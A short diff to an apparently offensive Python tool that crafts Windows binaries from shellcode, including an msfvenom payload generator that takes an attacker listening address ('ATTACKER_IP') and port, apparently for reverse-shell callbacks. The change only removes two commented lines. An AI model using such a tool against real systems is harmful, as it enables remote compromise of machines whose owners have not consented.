@@ -213,7 +213,6 @@ if __name__ == '__main__':
 
 	if args.test:
 		cprint("[-] Test mode activate : ignoring all options, using default.","yellow")
-		# _shellcodefile = "{0}/{1}".format(_appdir,config['shellcodefile'])
 		craftbinary(_shellcodefile,_outputdir, "test_calc.exe",_appdir)
 		buildbinary("windows", "386", _outputdir,"test_calc.exe")
 		sys.exit()
@@ -252,7 +251,6 @@ if __name__ == '__main__':
 		if not args.lhost:
 			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
 			sys.exit()
-		# platform,arch,shellcodedir,shellcodename,lhost,lport,params):
 		msfvenom_generator(_platform, _arch, _shellcodedir, _biname, args.lhost, args.lport,_msfvenomargs)
 		craftbinary("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir)
 	else:
